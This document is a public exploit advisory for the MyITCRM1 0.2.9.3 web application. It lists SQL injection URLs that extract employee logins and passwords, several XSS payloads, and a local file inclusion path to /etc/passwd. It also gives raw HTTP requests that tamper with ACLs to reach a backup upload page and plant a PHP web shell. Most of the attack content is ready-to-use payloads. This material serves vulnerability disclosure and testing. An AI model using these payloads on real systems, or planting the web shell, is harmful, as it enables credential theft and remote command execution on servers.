# Exploit Title: MyITCRM1 0.2.9.3 - Multiple vulnerabilities
# Date: 2018-07-28
# Exploit Author: Steve Kelly
# Writeup: http://stevekelly.org.uk/2018/07/28/exploit-myitcrm1-0-2-9-3/

# The application suffers from a number of vulnerabilities, namely XSS, SQL Injections, LFI, Directory listing disclosure and partial arbitrary file upload.

SQL Injections (Authenicated User required)
============================================
index.php?page=customer%3Aview&name=%25%27+%20UNION%20select%20null,EMPLOYEE_LOGIN,null,null,null,null,null,null,null,null,null,null,null,null,EMPLOYEE_PASSWD,null,null,null,null%20FROM%20MYIT_TABLE_EMPLOYEE%20--%20&submit=Search
index.php?page=refund:search&refund_search_category=ID&refund_search_term=%27%20UNION%20select%20EMPLOYEE_LOGIN,EMPLOYEE_PASSWD,3,4,5,6,7,8,9,10,11%20FROM%20MYIT_TABLE_EMPLOYEE%20--%20&submit=Search
index.php?page=supplier:search&supplier_search_category=ID&supplier_search_term=' UNION select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null -- &submit=Search

XSS Attacks
============
index.php?page=core:error&error_msg=%3Cscript%3Ealert(%22test%22)%3C/script%3E:main&menu=1
index.php?page=schedule:main&y=2%3Cscript%3Ealert(%22test%22)%3C/script%3E&m=07&d=27&
index.php?page=schedule:main&y=2&m=07%3Cscript%3Ealert(%22test%22)%3C/script%3E&d=27&page_title=schedule
index.php?page=schedule:main&y=2&m=07&d=27%3Cscript%3Ealert(%22test%22)%3C/script%3E&page_title=schedule
index.php?page=schedule:main&y=2&m=07&d=27&page_title=schedule%3C/title%3E%3Cscript%3Ealert(%22test%22)%3C/script%3E
login.php?from=/myit/MyITCRM-0.2.9.3/index.php?page=core:error&error_msg=%3Cscript%3Ealert(%22test%22)%3C/script%3E:main&menu=1
login.php?error_msg=%3Cscript%3Ealert(%22test%22)%3C/script%3E

Database Backups
=================
# Backups will goto the folder backup/ which is protected by .htaccess, apache misconfiguration may lead to access being allowed
cron/backup.php
modules/control/restore.php

Potential File Upload and SQL Injection
========================================
# As backup falls back on directory restriction based on .htaccess, apache misconfiguration may lead to access being allowed
backup/bigfile.php

# If access is viable, an attacker could upload a SQL file with dangerous code e.g.
test.sql:    select "<php system($_GET['cmd']); ?>" into outfile '/var/www/myit/MyITCRM-0.2.9.3/upload/shell.php';


Local File Inclusion and Directory listing
===========================================
# By modifying the ACL's using SQL injection, it's possible to access other files on the server that were not intended
# It is also possible to bypass the .htaccess on the backup directory by doing the following

    POST /myit/MyITCRM-0.2.9.3/index.php?page=control:acl HTTP/1.1
    Host: 192.168.80.143
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.80.143/myit/MyITCRM-0.2.9.3/index.php?page=control:acl
    Cookie: PHPSESSID=b1unred3irhi378578nocsojv3; sdmenu_my_menu=111111111
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 58

    workorder:close%5Bpage%5D=../backup:bigdump&submit=Submit


# This will rename the wordorder:close module to ../backup:bigdump in the ACL list, allowing it to be accessed via
index.php?page=../backup:bigdump

# Accessing this file will display all files in the CRM root directory and allow File upload as detailed in the "Potential File Upload and SQL Injection" section

    POST /myit/MyITCRM-0.2.9.3/index.php?page=../backup:bigdump HTTP/1.1
    Host: 192.168.80.143
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.80.143/myit/MyITCRM-0.2.9.3/backup/bigdump.php
    Cookie: PHPSESSID=b1unred3irhi378578nocsojv3; sdmenu_my_menu=111111111
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=---------------------------51653082412369960051946259098
    Content-Length: 519
    -----------------------------51653082412369960051946259098
    Content-Disposition: form-data; name="MAX_FILE_SIZE"
    $upload_max_filesize
    -----------------------------51653082412369960051946259098
    Content-Disposition: form-data; name="dumpfile"; filename="test.sql"
    Content-Type: application/sql
    select "<php system($_GET['cmd']); ?>" into outfile '/var/www/myit/MyITCRM-0.2.9.3/upload/shell.php';
    -----------------------------51653082412369960051946259098
    Content-Disposition: form-data; name="uploadbutton"
    Upload
    -----------------------------51653082412369960051946259098--


# Using the same method, it may be possible to do local file inclusion to other files on the host
index.php?page=../../../../../../etc:passwd%00
etc.


Arbitrary File Upload
======================
# It is possible to upload any file to upload/ via the customer:email page, the page itself is extremely buggy and appears to need Swift setup properly in order to send emails
index.php?page=customer:email
